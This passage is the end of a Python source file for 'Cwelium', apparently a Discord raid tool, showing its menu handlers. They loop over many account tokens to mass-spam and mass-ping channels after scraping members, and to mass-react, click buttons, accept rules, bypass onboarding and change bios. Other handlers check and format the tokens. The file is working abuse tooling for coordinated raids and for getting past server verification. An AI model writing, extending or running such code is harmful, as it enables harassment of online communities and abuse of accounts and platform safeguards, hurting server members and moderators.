                random_str = input(console.prompt("Random String", True))
        message = input(console.prompt("Message"))

        if message == "":
            self.main_menu()

        if "y" in massping:
            console.log(f"Scraping users", self.background, False, "this may take a while...")
            self.raider.member_scrape(guild_id, channel_id)
            count = input(console.prompt("Pings Amount"))
            if count == "":
                self.main_menu()

            if "y" in random_str:
                args = [
                    (token, channel_id, message, guild_id, True, count, True) for token in tokens
                ]
                self.run(self.raider.spammer, args)
            else:
                args = [
                    (token, channel_id, message, guild_id, True, count) for token in tokens
                ]
                self.run(self.raider.spammer, args)
        else:
            if "y" in random_str:
                args = [
                    (token, channel_id, message, guild_id, False, None, True) for token in tokens
                ]
                self.run(self.raider.spammer, args)
            else:
                args = [
                    (token, channel_id, message, guild_id, False, None) for token in tokens
                ]
                self.run(self.raider.spammer, args)

    def checker(self):
        console.title(f"Cwelium - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title(f"Cwelium - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def formatter(self):
        console.title(f"Cwelium - Formatter")
        self.run(self.raider.format_tokens, [()])
    
    @wrapper
    def button(self):
        console.title(f"Cwelium - Clicker")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        
        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        args = [
            (token, message_id, channel_id, guild_id) for token in tokens
        ]
        self.run(self.raider.button_bypass, args)

    @wrapper
    def accept(self):
        console.title(f"Cwelium - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        console.title(f"Cwelium - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio_changer(self):
        console.title(f"Cwelium - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            self.main_menu()

        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        console.title(f"Cwelium - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: Tips",
            "Scraper: Aniell4",
            "Original Owner of Helium/Cwelium: Ekkore",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]

        for line in credits_lines:
            try:
                term_size = os.get_terminal_size().columns
            except (AttributeError, OSError):
                term_size = 80
            centered_line = line.center(term_size)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")

        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def exits(self):
        os._exit(0)

if __name__ == "__main__":
    Menu().main_menu()
